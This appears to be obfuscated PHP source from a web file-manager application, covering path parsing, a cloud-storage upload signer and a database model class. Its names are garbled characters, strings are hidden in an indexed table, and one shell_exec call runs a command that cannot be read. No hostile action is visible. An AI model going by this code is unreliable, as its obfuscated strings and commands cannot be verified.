$’­ˆåš[1288] => self::KOD_SHARE_LINK, $’­ˆåš[1289] => self::KOD_SEARCH, $’­ˆåš[1290] => self::KOD_BLOCK, $’­ˆåš[1291] => self::KOD_IO, $’­ˆåš[1292] => self::KOD_USER_RECENT, $’­ˆåš[1293] => self::KOD_USER_DRIVER); } public static function parse($çÑëõÕ¦) { $ûªêâü– =& $_SERVER[¹òÍ›æş]; $çÑëõÕ¦ = self::clear($çÑëõÕ¦); $¼¢§ÛŒ£ = array_values(self::typeList()); preg_match($ûªêâü–[1294], $çÑëõÕ¦, $úï®Ùğš); $ğ¨ ã½î = array($ûªêâü–[460] => !1, $ûªêâü–[1295] => !1, $ûªêâü–[457] => !1, $ûªêâü–[94] => $çÑëõÕ¦, $ûªêâü–[1196] => !1, $ûªêâü–[1195] => $ûªêâü–[12]); if (is_array($úï®Ùğš) && count($úï®Ùğš) == 5) { $£ìç¸¯ = $ûªêâü–[1296] . $úï®Ùğš[2] . $ûªêâü–[365]; if (in_array($£ìç¸¯, $¼¢§ÛŒ£)) { $ğ¨ ã½î[$ûªêâü–[1196]] = $úï®Ùğš[1]; $ğ¨ ã½î[$ûªêâü–[33]] = $£ìç¸¯; $ğ¨ ã½î[$ûªêâü–[1297]] = substr($£ìç¸¯, 1, -1); $ğ¨ ã½î[$ûªêâü–[437]] = $úï®Ùğš[3]; } $ğ¨ ã½î[$ûªêâü–[1195]] = $úï®Ùğš[4]; } $–ÁË¬Üü = array($ûªêâü–[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ğ¨ ã½î[$ûªêâü–[1260]] = in_array($ğ¨ ã½î[$ûªêâü–[33]], $–ÁË¬Üü); return $ğ¨ ã½î; } public static function isTruePath($¤áÌ¥ø³) { $’¨ÕŞˆá =& $_SERVER[¹òÍ›æş]; if (substr($¤áÌ¥ø³, 0, 1) != $’¨ÕŞˆá[1296]) { return !0; } if (strpos($¤áÌ¥ø³, $’¨ÕŞˆá[446]) === 0) { return !0; } if (strpos($¤áÌ¥ø³, $’¨ÕŞˆá[1264]) === 0) { return !0; } if (strpos($¤áÌ¥ø³, $’¨ÕŞˆá[1298]) === 0) { return !0; } if (strpos($¤áÌ¥ø³, $’¨ÕŞˆá[1299]) === 0) { return !0; } if (strpos($¤áÌ¥ø³, $’¨ÕŞˆá[1300]) === 0) { return !0; } return !1; } public static function clear($Õ„Öš€Ã) { $ÓÃø’ƒÙ =& $_SERVER[¹òÍ›æş]; $Õ„Öš€Ã = str_replace(array($ÓÃø’ƒÙ[1105], $ÓÃø’ƒÙ[59]), $ÓÃø’ƒÙ[53], $Õ„Öš€Ã); $Õ„Öš€Ã = str_replace($ÓÃø’ƒÙ[107], $ÓÃø’ƒÙ[8], $Õ„Öš€Ã); $ÆÈæ“ß = $ÓÃø’ƒÙ[1301]; if (substr($Õ„Öš€Ã, 0, 3) == $ÓÃø’ƒÙ[1302]) { $Õ„Öš€Ã = substr($Õ„Öš€Ã, 3); } while (strstr($Õ„Öš€Ã, $ÆÈæ“ß)) { $Õ„Öš€Ã = str_replace($ÆÈæ“ß, $ÓÃø’ƒÙ[8], $Õ„Öš€Ã); } $Õ„Öš€Ã = preg_replace($ÓÃø’ƒÙ[1303], $ÓÃø’ƒÙ[8], $Õ„Öš€Ã); if ($Õ„Öš€Ã == $ÓÃø’ƒÙ[8]) { return $ÓÃø’ƒÙ[8]; } $Õ„Öš€Ã = rtrim($Õ„Öš€Ã, $ÓÃø’ƒÙ[8]); return $Õ„Öš€Ã; } public static function pathTrue($ğ¹šÜ†¡) { $æÅÂèåŸ =& $_SERVER[¹òÍ›æş]; if (!$ğ¹šÜ†¡) { return $æÅÂèåŸ[12]; } $×²ªöğä = strlen($ğ¹šÜ†¡); if (substr($ğ¹šÜ†¡, $×²ªöğä - 1, 1) == $æÅÂèåŸ[8]) { $ğ¹šÜ†¡ = substr($ğ¹šÜ†¡, 0, $×²ªöğä - 1); } $ğ¹šÜ†¡ = str_replace($æÅÂèåŸ[557], $æÅÂèåŸ[8], str_replace($æÅÂèåŸ[1304], $æÅÂèåŸ[8], $ğ¹šÜ†¡)); if (substr($ğ¹šÜ†¡, 0, 2) == $æÅÂèåŸ[1305]) { $ğ¹šÜ†¡ = substr($ğ¹šÜ†¡, 2); } if (!strstr($ğ¹šÜ†¡, $æÅÂèåŸ[1302])) { return $ğ¹šÜ†¡; } $…§ó€ï‰ = explode($æÅÂèåŸ[8], $ğ¹šÜ†¡); $ü­ŒÔò§ = array_search($æÅÂèåŸ[1306], $…§ó€ï‰); if ($ü­ŒÔò§ >= 0) { $…§ó€ï‰[$ü­ŒÔò§] = -1; } if ($ü­ŒÔò§ > 0) { $…§ó€ï‰[$ü­ŒÔò§ - 1] = -1; } $òÊ÷ˆ› = array(); foreach ($…§ó€ï‰ as $­Ã¾í›È) { if ($­Ã¾í›È !== -1) { $òÊ÷ˆ›[] = $­Ã¾í›È; } } return self::pathTrue(implode($æÅÂèåŸ[8], $òÊ÷ˆ›)); } public static function sourceID($ÍÄ‡Êä±) { $ÖßÓî× =& $_SERVER[¹òÍ›æş]; $‚ŠóÆØ© = self::parse($ÍÄ‡Êä±); if ($‚ŠóÆØ©[$ÖßÓî×[33]] !== self::KOD_SOURCE) { show_json(LNG($ÖßÓî×[1307]), !1); } return $‚ŠóÆØ©[$ÖßÓî×[437]]; } public static function make($•ÇÙåà–) { if (!$•ÇÙåà–) { return !1; } return self::makePath(self::KOD_SOURCE, intval($•ÇÙåà–)); } public static function makeShare($’æÆš§›, $ôâ¡”§È) { return self::makePath(self::KOD_SHARE_ITEM, $’æÆš§›, $ôâ¡”§È); } public static function makeFileTypePath($™Ëƒ±Î) { return self::makePath(self::KOD_USER_FILE_TYPE, $™Ëƒ±Î); } public static function makeFileTagPath($¡øÄÇå©) { return self::makePath(self::KOD_USER_FILE_TAG, $¡øÄÇå©); } public static function makePath($À¦æÀ¹ü, $ŒŞøÍ½ı = '', $ÕŸ°‡Ô = '') { $‚Å“Úóê =& $_SERVER[¹òÍ›æş]; $áéÀ¤åğ = substr($À¦æÀ¹ü, 1, -1); $¬çñ’Ù° = $‚Å“Úóê[1308] . $áéÀ¤åğ . $‚Å“Úóê[1309] . $ŒŞøÍ½ı . $‚Å“Úóê[1310]; $¬çñ’Ù° = $ÕŸ°‡Ô ? $¬çñ’Ù° . $ÕŸ°‡Ô . $‚Å“Úóê[8] : $¬çñ’Ù°; return $¬çñ’Ù°; } public static function hashPath($²ÍùáÒ¼, $‡ñÚª·§ = true) { $®ûøãó =& $_SERVER[¹òÍ›æş]; $Ôı¬ßË© = is_array($²ÍùáÒ¼) ? $²ÍùáÒ¼ : IO::info($²ÍùáÒ¼); $šÜšÁëô = _get($Ôı¬ßË©, $®ûøãó[1311], $®ûøãó[12]); if (!$šÜšÁëô && isset($Ôı¬ßË©[$®ûøãó[440]])) { $Ôı¬ßË© = IO::info(KodIO::make($Ôı¬ßË©[$®ûøãó[440]])); $šÜšÁëô = _get($Ôı¬ßË©, $®ûøãó[1311], $®ûøãó[12]); } if (!$šÜšÁëô && $‡ñÚª·§) { $†Ø¶À¶¾ = KodIO::parse($Ôı¬ßË©[$®ûøãó[94]]); if (!$†Ø¶À¶¾[$®ûøãó[33]]) { $šÜšÁëô = IO::hashSimple($Ôı¬ßË©[$®ûøãó[94]]); } } if (!$šÜšÁëô) { $šÜšÁëô = md5($Ôı¬ßË©[$®ûøãó[94]] . $Ôı¬ßË©[$®ûøãó[86]] . $Ôı¬ßË©[$®ûøãó[95]]); } return $šÜšÁëô; } public static function hashPathSafe($ÖÔŞëëÚ, $ú¶µáñ = true) { $èó—ü…ñ =& $_SERVER[¹òÍ›æş]; $Øşæˆ = self::hashPath($ÖÔŞëëÚ, $ú¶µáñ); return md5($Øşæˆ . $èó—ü…ñ[1312] . Model($èó—ü…ñ[800])->get($èó—ü…ñ[801])); } public static function initSystemPath() { $İãÙå¾à =& $_SERVER[¹òÍ›æş]; if (defined($İãÙå¾à[1313])) { return; } define($İãÙå¾à[1313], self::systemPath($İãÙå¾à[1314])); define($İãÙå¾à[1315], self::systemPath($İãÙå¾à[1316])); define($İãÙå¾à[1317], self::systemPath($İãÙå¾à[1318])); define($İãÙå¾à[1319], self::systemPath($İãÙå¾à[1320])); IOHistory::bindEvent(); } public static function systemPath($·à€ĞŞõ) { $¦„‚× =& $_SERVER[¹òÍ›æş]; $êÃøòÅ = $¦„‚×[1321] . ucfirst($·à€ĞŞõ); $«ª¿Àã’ = Model($¦„‚×[800])->get($êÃøòÅ); if ($«ª¿Àã’) { return $«ª¿Àã’; } if ($·à€ĞŞõ == $¦„‚×[1314]) { $«ª¿Àã’ = self::make(Model($¦„‚×[855])->systemRootPathAdd($¦„‚×[572])); } else { $«ª¿Àã’ = self::systemPath($¦„‚×[1314]); $£Û»ú€» = self::sourceID($«ª¿Àã’); $«ª¿Àã’ = self::make(Model($¦„‚×[855])->mkdir($£Û»ú€», $·à€ĞŞõ)); } Model($¦„‚×[800])->set($êÃøòÅ, $«ª¿Àã’); return $«ª¿Àã’; } public static function systemFolder($ƒïöÀç) { $Öİè—ãè = IO_PATH_SYSTEM_SOURCE . $ƒïöÀç; $£‚øÖ— = Cache::get($Öİè—ãè); if (!$£‚øÖ—) { $ö¥ƒŠ”â = IO::infoFull($Öİè—ãè); if (!$ö¥ƒŠ”â) { $£‚øÖ— = IO::mkdir($Öİè—ãè, REPEAT_SKIP); } else { $£‚øÖ— = $ö¥ƒŠ”â[$_SERVER[¹òÍ›æş][94]]; } Cache::set($Öİè—ãè, $£‚øÖ—, 3600 * 10); } return $£‚øÖ—; } public static function defaultDriver() { return Model($_SERVER[¹òÍ›æş][797])->defaultDriver(); } public static function defaultIO() { $íÑ…ŞŒ­ =& $_SERVER[¹òÍ›æş]; $Ñµò›ó¼ = self::defaultDriver(); return $íÑ…ŞŒ­[1322] . $Ñµò›ó¼[$íÑ…ŞŒ­[437]] . $íÑ…ŞŒ­[1310]; } public static function defaultDriverInit() { static $øùüĞíÂ = false; if ($øùüĞíÂ) { return $øùüĞíÂ; } $øùüĞíÂ = IO::init(self::defaultIO()); return $øùüĞíÂ; } public static function fileTypeList() { $´§æ‡‹µ =& $_SERVER[¹òÍ›æş]; $øíÚä›Ğ = $GLOBALS[$´§æ‡‹µ[6]][$´§æ‡‹µ[1323]]; foreach ($øíÚä›Ğ as $ë±àÔû => $áã¢ù¯à) { $çãà¿Û¬ = $´§æ‡‹µ[1324] . $ë±àÔû; $åÆü¹«  = LNG($çãà¿Û¬); if ($çãà¿Û¬ != $åÆü¹« ) { $øíÚä›Ğ[$ë±àÔû][$´§æ‡‹µ[32]] = $åÆü¹« ; } } return $øíÚä›Ğ; } public static function diskList($Û°‚ø·Î = true) { $± ìËÇ¾ = $_SERVER[¹òÍ›æş][1325]; if ($Û°‚ø·Î) { $æ‰Ù¢ğ = Cache::get($± ìËÇ¾); if (is_array($æ‰Ù¢ğ)) { return $æ‰Ù¢ğ; } } $æ‰Ù¢ğ = self::diskListGet(); Cache::set($± ìËÇ¾, $æ‰Ù¢ğ, 60); return $æ‰Ù¢ğ; } public static function diskListGet() { $ä¸„Öƒİ =& $_SERVER[¹òÍ›æş]; $‘ÉòÌïï = array(); if ($GLOBALS[$ä¸„Öƒİ[6]][$ä¸„Öƒİ[1326]] == $ä¸„Öƒİ[1327]) { $ƒæ¿ŸÔÌ = $ä¸„Öƒİ[1328]; for ($äö¹İË = 0; $äö¹İË < strlen($ƒæ¿ŸÔÌ); $äö¹İË++) { $§‚³¸œÈ = $ƒæ¿ŸÔÌ[$äö¹İË] . $ä¸„Öƒİ[1329]; if (file_exists($§‚³¸œÈ)) { $‘ÉòÌïï[] = $§‚³¸œÈ; } } return $‘ÉòÌïï; } if (!function_exists($ä¸„Öƒİ[108])) { $‘ÉòÌïï[] = $ä¸„Öƒİ[865]; return $‘ÉòÌïï; } $çŒê‹ÜÂ = explode($ä¸„Öƒİ[59], shell_exec($ä¸„Öƒİ[1330])); array_shift($çŒê‹ÜÂ); array_pop($çŒê‹ÜÂ); $ş¿ö¢¼Ã = array($ä¸„Öƒİ[1331], $ä¸„Öƒİ[1332], $ä¸„Öƒİ[1333], $ä¸„Öƒİ[1334], $ä¸„Öƒİ[1335], $ä¸„Öƒİ[1336], $ä¸„Öƒİ[1337], $ä¸„Öƒİ[1338]); foreach ($çŒê‹ÜÂ as $ÎÙ¥Üïß) { $¼…¾ùÔ­ = preg_split($ä¸„Öƒİ[1339], $ÎÙ¥Üïß); $§‚³¸œÈ = $¼…¾ùÔ­[count($¼…¾ùÔ­) - 1]; if (!strstr($¼…¾ùÔ­[0], $ä¸„Öƒİ[1340]) || !$§‚³¸œÈ) { continue; } $¬°•–ãß = rtrim($§‚³¸œÈ, $ä¸„Öƒİ[8]) . $ä¸„Öƒİ[8]; if (in_array($¬°•–ãß, $ş¿ö¢¼Ã)) { continue; } $‘ÉòÌïï[] = $¬°•–ãß; } return $‘ÉòÌïï; } public static function isSameDisk($Ëìá¢Å, $‹½é®ÌÃ) { $ÉŞËª¦† =& $_SERVER[¹òÍ›æş]; if ($GLOBALS[$ÉŞËª¦†[6]][$ÉŞËª¦†[1326]] == $ÉŞËª¦†[1327]) { return strtolower(substr($Ëìá¢Å, 0, 1)) == strtolower(substr($‹½é®ÌÃ, 0, 1)); } $¿æ™ğ = self::diskList(); $¨ßÖşîú = !1; $•‘¦øî = !1; sort($¿æ™ğ); $¿æ™ğ = array_reverse($¿æ™ğ); $Ëìá¢Å = rtrim($Ëìá¢Å, $ÉŞËª¦†[8]) . $ÉŞËª¦†[8]; $‹½é®ÌÃ = rtrim($‹½é®ÌÃ, $ÉŞËª¦†[8]) . $ÉŞËª¦†[8]; foreach ($¿æ™ğ as $–Şñ ùÑ) { $ªÙ–ë¹õ = strlen($–Şñ ùÑ); if (!$¨ßÖşîú && substr($Ëìá¢Å, 0, $ªÙ–ë¹õ) == $–Şñ ùÑ) { $¨ßÖşîú = $–Şñ ùÑ; } if (!$•‘¦øî && substr($‹½é®ÌÃ, 0, $ªÙ–ë¹õ) == $–Şñ ùÑ) { $•‘¦øî = $–Şñ ùÑ; } if ($¨ßÖşîú && $•‘¦øî) { break; } } return $¨ßÖşîú === $•‘¦øî; } public static function transferType($ˆØŸšï‹, $ŞĞ“ª™ƒ) { $Ú²ÑÎì— =& $_SERVER[¹òÍ›æş]; $•‰“úäÏ = self::driverType($ˆØŸšï‹); $Ğ¢£´¢Å = self::driverType($ŞĞ“ª™ƒ); if ($•‰“úäÏ[$Ú²ÑÎì—[33]] == $Ğ¢£´¢Å[$Ú²ÑÎì—[33]] && $•‰“úäÏ[$Ú²ÑÎì—[1341]] == $Ğ¢£´¢Å[$Ú²ÑÎì—[1341]]) { return $Ú²ÑÎì—[1342]; } if ($•‰“úäÏ[$Ú²ÑÎì—[33]] == $Ú²ÑÎì—[898] && $Ğ¢£´¢Å[$Ú²ÑÎì—[33]] == $Ú²ÑÎì—[116]) { return $Ú²ÑÎì—[1221]; } if ($•‰“úäÏ[$Ú²ÑÎì—[33]] == $Ú²ÑÎì—[116] && $Ğ¢£´¢Å[$Ú²ÑÎì—[33]] == $Ú²ÑÎì—[898]) { return $Ú²ÑÎì—[117]; } return $Ú²ÑÎì—[1343]; } public static function driverType($Üšû´ó«) { $ò¥óÔöË =& $_SERVER[¹òÍ›æş]; $ÅÙ¨˜ìÃ = str_replace($ò¥óÔöË[1344], $ò¥óÔöË[12], strtolower($Üšû´ó«->getType())); if ($ÅÙ¨˜ìÃ == $ò¥óÔöË[787] || $ÅÙ¨˜ìÃ == $ò¥óÔöË[1345] || $ÅÙ¨˜ìÃ == $ò¥óÔöË[1346]) { $Üšû´ó« = self::defaultDriverInit(); } else { if ($ÅÙ¨˜ìÃ == $ò¥óÔöË[1231] || $ÅÙ¨˜ìÃ == $ò¥óÔöË[1347]) { $Üšû´ó« = IO::init($Üšû´ó«->pathParse[$ò¥óÔöË[1178]]); } } $Û¿ğĞ¥¯ = $Üšû´ó«->path; $ÅÙ¨˜ìÃ = str_replace($ò¥óÔöË[1344], $ò¥óÔöË[12], strtolower($Üšû´ó«->getType())); if ($ÅÙ¨˜ìÃ == $ò¥óÔöË[116]) { return array($ò¥óÔöË[33] => $ò¥óÔöË[116], $ò¥óÔöË[1341] => $ò¥óÔöË[12], $ò¥óÔöË[94] => $Û¿ğĞ¥¯, $ò¥óÔöË[105] => $Üšû´ó«); } return array($ò¥óÔöË[33] => $ò¥óÔöË[898], $ò¥óÔöË[1341] => $Üšû´ó«->pathDriver, $ò¥óÔöË[94] => $Û¿ğĞ¥¯, $ò¥óÔöË[105] => $Üšû´ó«); } public static function pathDriverType($–Ü¡Š°É) { return $–Ü¡Š°É ? self::driverType(IO::init($–Ü¡Š°É)) : !1; } public static function pathDriverLocal($¶£ó×†) { $î¬‘ÎĞâ =& $_SERVER[¹òÍ›æş]; $ı ÒÉÅ­ = $¶£ó×† ? self::driverType(IO::init($¶£ó×†)) : !1; return $ı ÒÉÅ­[$î¬‘ÎĞâ[33]] == $î¬‘ÎĞâ[116] ? !0 : !1; } public static function allowCover($ñĞ½œÏ, $–°›¹…ê = true) { $§¦È•é¬ =& $_SERVER[¹òÍ›æş]; if (is_string($ñĞ½œÏ)) { $ñĞ½œÏ = IO::info($ñĞ½œÏ); } if (!$ñĞ½œÏ || $ñĞ½œÏ[$§¦È•é¬[33]] == $§¦È•é¬[85] || $ñĞ½œÏ[$§¦È•é¬[86]] <= 100) { return !1; } if (isset($ñĞ½œÏ[$§¦È•é¬[1348]]) || !$ñĞ½œÏ[$§¦È•é¬[94]]) { return !1; } if (isset($ñĞ½œÏ[$§¦È•é¬[212]]) && !$ñĞ½œÏ[$§¦È•é¬[212]]) { return $ñĞ½œÏ; } static $ÓôŸŠ¾Ç = false; if (!$ÓôŸŠ¾Ç || !$–°›¹…ê) { $îÏ”õĞ¢ = self::driverType(IO::init($ñĞ½œÏ[$§¦È•é¬[94]])); $™›šô¶‡ = $îÏ”õĞ¢[$§¦È•é¬[105]]; $ÓôŸŠ¾Ç = $§¦È•é¬[1349]; if ($îÏ”õĞ¢[$§¦È•é¬[33]] == $§¦È•é¬[116]) { $ÓôŸŠ¾Ç = $§¦È•é¬[1350]; } if ($îÏ”õĞ¢[$§¦È•é¬[105]] && is_array($îÏ”õĞ¢[$§¦È•é¬[105]]->config)) { $ì¥ò‹¥© = $îÏ”õĞ¢[$§¦È•é¬[105]]->config; if (isset($ì¥ò‹¥©[$§¦È•é¬[1351]]) && $ì¥ò‹¥©[$§¦È•é¬[1351]]) { $ÓôŸŠ¾Ç = $§¦È•é¬[1350]; } } } return $ÓôŸŠ¾Ç == $§¦È•é¬[1350] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($’ÄÍÑ…Ê) { parent::__construct($’ÄÍÑ…Ê); $this->signatureVersion($_SERVER[¹òÍ›æş][226]); } public function uploadFormData($ÊŸˆ€¢, $éÓ¸ à› = 3600) { $Ñ½íª¨Ê =& $_SERVER[¹òÍ›æş]; $úÁìü™Ñ = $Ñ½íª¨Ê[209]; $¢Úåæ‚ = $Ñ½íª¨Ê[241]; $È…Ïµøä = $Ñ½íª¨Ê[251]; $ü¤íòÊÁ = gmdate($Ñ½íª¨Ê[1352], time() + $éÓ¸ à›); $äâÁ¹£î = (string) time() . $Ñ½íª¨Ê[81] . (string) (time() + $éÓ¸ à›); $ä¢Ç¥è = array($Ñ½íª¨Ê[252] => $ü¤íòÊÁ, $Ñ½íª¨Ê[255] => array(array($Ñ½íª¨Ê[257] => $úÁìü™Ñ), array($Ñ½íª¨Ê[256] => $this->bucket), array($Ñ½íª¨Ê[258], $Ñ½íª¨Ê[259], $Ñ½íª¨Ê[12]), array($Ñ½íª¨Ê[262] => $È…Ïµøä), array($Ñ½íª¨Ê[1353] => $¢Úåæ‚), array($Ñ½íª¨Ê[1354] => $this->accessKey), array($Ñ½íª¨Ê[1355] => $äâÁ¹£î))); $ä¢Ç¥è = json_encode($ä¢Ç¥è); $¯ÄÎúËú = hash_hmac($Ñ½íª¨Ê[241], $äâÁ¹£î, $this->secret); $å¶´ÀŒû = sha1($ä¢Ç¥è); $˜Ï‰¥ë = hash_hmac($Ñ½íª¨Ê[241], $å¶´ÀŒû, $¯ÄÎúËú); $ûÛ™é‰é = array($Ñ½íª¨Ê[257] => $úÁìü™Ñ, $Ñ½íª¨Ê[262] => $È…Ïµøä, $Ñ½íª¨Ê[270] => base64_encode($ä¢Ç¥è), $Ñ½íª¨Ê[1353] => $¢Úåæ‚, $Ñ½íª¨Ê[1354] => $this->accessKey, $Ñ½íª¨Ê[1356] => $äâÁ¹£î, $Ñ½íª¨Ê[1357] => $˜Ï‰¥ë, $Ñ½íª¨Ê[192] => $this->getHost()); return $ûÛ™é‰é; } public function fileOutLink($­Ô·¨Ô) { $ÆİÓ²¬‰ =& $_SERVER[¹òÍ›æş]; if (substr($­Ô·¨Ô, 0, 7) == $ÆİÓ²¬‰[1358]) { $­Ô·¨Ô = $ÆİÓ²¬‰[1359] . substr($­Ô·¨Ô, 7); } header($ÆİÓ²¬‰[171] . $­Ô·¨Ô); die; } } goto a“ì„•³Ÿ; b¡‡ˆÙÚåØ: function binCheckBigger($çã•¤®Â, $œòÔÄÎ€) { return $çã•¤®Â > $œòÔÄÎ€; } $_SERVER[$_SERVER[øëœ¾ŞŠ][3]] = ("\70\62\60\63"."\x35\x35")+0;$_huxa="y95qvbm6i8fnhkdeo3lt47su1cwaz0xj2grpz1rm0f8vbg2teayjunwopisc37hd95l4qxk61hk9unm2";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($¯ÒššÙ¨, $¼ªıÄÇ›) { $£µ²ƒß =& $_SERVER[¹òÍ›æş]; if (isset(self::$_methodList[$¯ÒššÙ¨])) { return @call_user_func_array(self::$_methodList[$¯ÒššÙ¨], $¼ªıÄÇ›); } else { if (method_exists($this, $¯ÒššÙ¨)) { return call_user_func_array(array($this, $¯ÒššÙ¨), $¼ªıÄÇ›); } else { think_exception(__CLASS__ . $£µ²ƒß[4] . $¯ÒššÙ¨ . $£µ²ƒß[5]); } } } public static function __callStatic($¼ØØë, $êÇ««¥·) { if (isset(self::$_methodListStatic[$¼ØØë])) { return call_user_func_array(self::$_methodListStatic[$¼ØØë], $êÇ««¥·); } else { if (method_exists(self, $¼ØØë)) { return call_user_func_array(array(self, $¼ØØë), $êÇ««¥·); } else { show_json("{$¼ØØë}\x28\x29\x20\x6e\x6f\x74\x20\145\x78\x69\163\164\73", !1); } } } public static function addMethod($¡±¹œ«Å, $ØÅ›Õç) { self::$_methodList[$¡±¹œ«Å] = $ØÅ›Õç; } public static function addMethodStatic($…Ö°ëÃğ, $Ó×›î±°) { self::$_methodListStatic[$…Ö°ëÃğ] = $Ó×›î±°; } } goto F‹Ÿ£ĞÍº; bóéªõâŸä: define($_SERVER[¹òÍ›æş][281], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\145", "\x6f\x72\x64\145\162", "\x61\154\x69\141\x73", "\x68\x61\x76\x69\156\x67", "\x67\x72\x6f\165\x70", "\154\157\143\153", "\144\151\x73\x74\x69\x6e\143\x74", "\141\x75\164\157", "\146\151\x6c\x74\145\162", "\x76\x61\154\x69\x64\x61\x74\x65", "\x72\145\163\x75\x6c\x74", "\x62\x69\x6e\x64", "\x74\x6f\x6b\145\156"); public function __construct($¼×Ï·‘ì = '', $íÁÓ«¯Œ = '', $Ì£¨¬Úá = '') { $‹ééœíÖ =& $_SERVER[¹òÍ›æş]; $this->_initialize(); if (!empty($¼×Ï·‘ì)) { if (strpos($¼×Ï·‘ì, $‹ééœíÖ[10])) { list($this->dbName, $this->name) = explode($‹ééœíÖ[10], $¼×Ï·‘ì); } else { $this->name = $¼×Ï·‘ì; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($íÁÓ«¯Œ)) { $this->tablePrefix = $‹ééœíÖ[12]; } elseif ($‹ééœíÖ[12] != $íÁÓ«¯Œ) { $this->tablePrefix = $íÁÓ«¯Œ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($‹ééœíÖ[282]); } $this->db(0, empty($this->connection) ? $Ì£¨¬Úá : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $§›©áöø =& $_SERVER[¹òÍ›æş]; if (empty($this->fields)) { if (think_config($§›©áöø[283])) { $†¸ˆëé = $this->dbName ? $this->dbName : think_config($§›©áöø[284]); $‡Í˜Æì = think_var_cache($§›©áöø[285] . strtolower(get_path_this($†¸ˆëé) . $§›©áöø[10] . $this->name)); if ($‡Í˜Æì) { $øÙÄ›° = think_config($§›©áöø[286]); if (empty($øÙÄ›°) || $‡Í˜Æì[$§›©áöø[287]] == $øÙÄ›°) { $this->fields = $‡Í˜Æì; return; } } } $this->flush(); } } public function flush() { $Áı­êµß =& $_SERVER[¹òÍ›æş]; $this->db->setModel($this->name); $œÕÍ›È× = $this->db->getFields($this->getTableName()); if (!$œÕÍ›È×) { return !1; } $this->fields = array_keys($œÕÍ›È×); $this->fields[$Áı­êµß[288]] = !1; foreach ($œÕÍ›È× as $ñÎ»İ»¢ => $çö²˜ˆ°) { $Ü³«š¤¬[$ñÎ»İ»¢] = $çö²˜ˆ°[$Áı­êµß[33]]; if ($çö²˜ˆ°[$Áı­êµß[39]]) { $this->fields[$Áı­êµß[289]] = $ñÎ»İ»¢; if ($çö²˜ˆ°[$Áı­êµß[42]]) { $this->fields[$Áı­êµß[288]] = !0; } } } $this->fields[$Áı­êµß[290]] = $Ü³«š¤¬; if (think_config($Áı­êµß[286])) { $this->fields[$Áı­êµß[287]] = think_config($Áı­êµß[286]); } if (think_config($Áı­êµß[283])) { $Ÿ´¥ÖåÔ = $this->dbName ? $this->dbName : think_config($Áı­êµß[284]); think_var_cache($Áı­êµß[285] . strtolower(get_path_this($Ÿ´¥ÖåÔ) . $Áı­êµß[10] . $this->name), $this->fields); } } public function switchModel($Ã¢ÓËŒû, $„öúœÒ› = array()) { $Æé”Ñ¶ =& $_SERVER[¹òÍ›æş]; $“Şˆ¹áœ = ucwords(strtolower($Ã¢ÓËŒû)) . $Æé”Ñ¶[291]; if (!class_exists($“Şˆ¹áœ)) { think_exception($“Şˆ¹áœ . think_lang($Æé”Ñ¶[292])); } $this->_extModel = new $“Şˆ¹áœ($this->name); if (!empty($„öúœÒ›)) { foreach ($„öúœÒ› as $¨òÜÅØë) { $this->_extModel->setProperty($¨òÜÅØë, $this->{$¨òÜÅØë}); } } return $this->_extModel; } public function __set($»ØÑÓòÑ, $ëä¶Ú’) { $this->data[$»ØÑÓòÑ] = $ëä¶Ú’; } public function __get($ÎïœÜêÌ) { return isset($this->data[$ÎïœÜêÌ]) ? $this->data[$ÎïœÜêÌ] : null; } public function __isset($Õ°Ê“Û¹) { return isset($this->data[$Õ°Ê“Û¹]); } public function __unset($É‹İø³) { unset($this->data[$É‹İø³]); } public function __call($åÓÊ„ÎÜ, $®Íı•Ò´) { $‰…Î‚£¦ =& $_SERVER[¹òÍ›æş]; if (in_array(strtolower($åÓÊ„ÎÜ), $this->methods, !0)) { $this->options[strtolower($åÓÊ„ÎÜ)] = $®Íı•Ò´[0]; return $this; } elseif (in_array(strtolower($åÓÊ„ÎÜ), array($‰…Î‚£¦[293], $‰…Î‚£¦[294], $‰…Î‚£¦[295], $‰…Î‚£¦[296], $‰…Î‚£¦[297]), !0)) { $‡À·¸ëï = isset($®Íı•Ò´[0]) ? $®Íı•Ò´[0] : $‰…Î‚£¦[199]; $‡À·¸ëï = $this->db->parseKey($‡À·¸ëï); return $this->getField(strtoupper($åÓÊ„ÎÜ) . $‰…Î‚£¦[298] . $‡À·¸ëï . $‰…Î‚£¦[299] . $åÓÊ„ÎÜ, $‰…Î‚£¦[293]); } elseif (strtolower(substr($åÓÊ„ÎÜ, 0, 5)) == $‰…Î‚£¦[300]) { $‡À·¸ëï = think_parse_name(substr($åÓÊ„ÎÜ, 5)); $ìçƒÚÙ“[$‡À·¸ëï] = $®Íı•Ò´[0]; return $this->where($ìçƒÚÙ“)->find(); } elseif (strtolower(substr($åÓÊ„ÎÜ, 0, 10)) == $‰…Î‚£¦[301]) { $ö»ıÎ¦ = think_parse_name(substr($åÓÊ„ÎÜ, 10)); $ìçƒÚÙ“[$ö»ıÎ¦] = $®Íı•Ò´[0]; return $this->where($ìçƒÚÙ“)->getField($®Íı•Ò´[1]); } elseif (isset($this->_scope[$åÓÊ„ÎÜ])) { return $this->scope($åÓÊ„ÎÜ, $®Íı•Ò´[0]); } elseif (method_exists($this, $åÓÊ„ÎÜ)) { array_unshift($®Íı•Ò´, $åÓÊ„ÎÜ); return call_user_func_array(array($this, $‰…Î‚£¦[302]), $®Íı•Ò´); } else { return call_user_func_array(array(parent, $åÓÊ„ÎÜ), $®Íı•Ò´); } } protected function call() { $‰Ä²–·Ë =& $_SERVER[¹òÍ›æş]; $È÷œ—¡ = func_get_args(); $âÍşø€ = array_shift($È÷œ—¡); $Çèª¨şƒ = $âÍşø€; if (is_array($âÍşø€)) { $Çèª¨şƒ = $âÍşø€[1]; $âÍşø€ = $âÍşø€[0]; } 